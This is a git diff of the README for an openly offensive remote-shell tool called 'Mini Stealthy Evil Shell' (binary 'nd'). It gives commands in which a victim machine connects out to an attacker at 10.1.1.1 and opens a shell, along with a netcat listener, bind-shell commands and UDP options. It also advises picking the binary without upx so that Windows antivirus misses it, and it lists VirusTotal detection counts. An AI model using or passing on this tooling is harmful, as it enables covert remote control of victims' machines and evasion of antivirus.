@@ -4,7 +4,7 @@ Mini Stealthy Evil Shell
 ## Roadmap
 - Reverse Shell
     - [x] TCP
-    - [ ] UDP
+    - [x] UDP
     - [ ] HTTP/S
     - [ ] ICMP
 - Bind Shell
@@ -17,34 +17,27 @@ Mini Stealthy Evil Shell
     - [ ] SSH backdoor server
 
 ## Choosing binary
-- Always choose the one without upx
-- There are only 2 types: `nd` (linux/amd64) `nd.exe` (windows/amd64)
+- There are only 2 types: `nd` (linux/amd64) `nd.exe` (windows/amd64)  
+- For windows, choose the one without upx to avoid being detected as virus.  
 
 ## Reverse shell
 ```
-+------------+            +------------+
-|            |            |            |
-|   victim   +------------>  attacker  |
-|  (netdog)  |            |  10.1.1.1  |
-|            |            |            |
-+------------+            +------------+
-```
-```bash
-./nd -host 10.1.1.1 # connect to attacker port 1234
++--------------------------------+            +--------------------------------+
+|                                |            |                                |
+|                         victim +------------> attacker (10.1.1.1)            |
+| ./nd -host 10.1.1.1 -port 1234 |            | nc -lvnp 1234                  |
+|                                |            |                                |
++--------------------------------+            +--------------------------------+
 ```
 
 ## Bind shell
 ```
-+------------+            +------------+
-|            |            |            |
-|   victim   <------------+  attacker  |
-|  (netdog)  |            |  10.1.1.1  |
-|            |            |            |
-+------------+            +------------+
-```
-```bash
-./nd -l -host 10.1.1.1 # listen on port 1234
-./nd -l -u # udp mode
++--------------------+            +--------------------+
+|                    |            |                    |
+|  victim (10.1.1.2) <------------+ attacker           |
+|       ./nd -l 1234 |            | nc 10.1.1.2 1234   |
+|                    |            |                    |
++--------------------+            +--------------------+
 ```
 
 ## AV status
@@ -54,3 +47,19 @@ Mini Stealthy Evil Shell
 | - | - | -| - |
 |without upx | 2.2 MB|[4/69](https://www.virustotal.com/gui/file/b042c2498ab6ee36ce998842d4ed4592d46f55026677f1f6e750edf7b6a2411d/detection)| pass|
 |with upx | 663 KB|[6/69](https://www.virustotal.com/gui/file/b6f9b09b20cda55d3e87d4f3c74971bffa65781c297ea4742c5987cc69b9b391/detection)| not pass|
+
+## Usage
+```
+$./nd -h
+Usage of ./nd:
+  -host string
+        Host (default "127.0.0.1")
+  -l    Bind mode
+  -port string
+        Port (default "1234")
+  -recon string
+        Reconnecting Time (default "15s")
+  -shell string
+        Unix Shell (default "/bin/sh")
+  -u    Enable UDP
+```
